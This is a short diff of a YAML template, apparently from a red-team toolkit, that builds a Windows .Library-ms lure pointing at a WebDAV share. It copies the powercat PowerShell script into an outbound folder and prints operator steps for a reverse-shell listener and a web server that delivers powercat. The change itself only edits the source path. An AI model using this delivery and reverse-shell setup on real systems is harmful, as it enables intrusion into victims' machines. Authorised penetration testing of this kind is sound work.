@@ -27,7 +27,7 @@ content: |
   </searchConnectorDescriptionList>
   </libraryDescription>
   ' > packstation/outbound/webdav/config.Library-ms; \
-  cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 packstation/outbound/;
+  cp {{ tools_dir }}/powershell-empire/powercat.ps1 packstation/outbound/;
 
   printf '%s\n' "1. Start a revshell listener: {{ include('scripts/listener-nc.yaml') }}"; \
   printf '%s\n' "2. Start a webserver for powercat:  python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound"; \
